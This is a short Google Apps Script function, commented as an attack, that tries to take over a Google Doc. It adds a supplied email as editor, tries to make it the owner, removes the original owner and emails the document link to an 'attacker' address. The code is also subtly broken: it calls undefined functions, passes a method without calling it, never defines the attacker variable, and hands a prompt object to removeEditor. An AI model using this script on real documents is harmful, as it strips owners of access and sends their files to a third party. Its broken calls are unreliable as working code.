function myFunction() {
  // get ui
  var ui = DocumentApp.getUi();

  // get doc owner
  var docOwner = ui.prompt("enter doc owner: ");

  // prompt for user input
  var email = ui.prompt("enter email: ");

  // make editor
  var g = DocumentApp.getActiveDocument();
  g.addEditor(email.getResponseText());

  // send email to attacker
  sendEmail(email.getResponseText());

  // set new owner of document
  setOwner(email.getResponseText);

  // remove original owner of document
  g.removeEditor(docOwner);

  // send email to attacker
  MailApp.sendEmail({
    to: attacker,
    subject: "document take over",
    htmlBody: "here is the link:" +
        g.getUrl(),
  });
}
